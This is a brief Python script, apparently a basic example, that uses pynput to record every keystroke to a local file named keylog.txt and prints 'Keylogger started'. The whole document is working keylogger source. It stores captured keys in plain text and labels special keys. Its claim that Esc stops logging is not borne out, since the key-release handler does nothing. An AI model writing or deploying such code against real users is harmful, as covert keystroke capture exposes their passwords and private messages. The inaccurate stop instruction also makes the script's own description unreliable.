from pynput.keyboard import Key, Listener

# Path to the log file where keystrokes will be saved
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def write_to_log(key):
    with open(log_file, "a") as f:
        if key == Key.enter:
            f.write("\n")
        elif key == Key.space:
            f.write(" ")
        elif key == Key.backspace:
            f.write("[BACKSPACE]")
        elif key == Key.shift_l or key == Key.shift_r:
            f.write("[SHIFT]")
        elif key == Key.caps_lock:
            f.write("[CAPSLOCK]")
        else:
            f.write(str(key).replace("'", ""))

# Function to handle key presses
def on_press(key):
    write_to_log(key)

# Function to handle key releases (not used in this basic example)
def on_release(key):
    pass

# Setup listener for keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press Esc to stop.")
    listener.join()
   

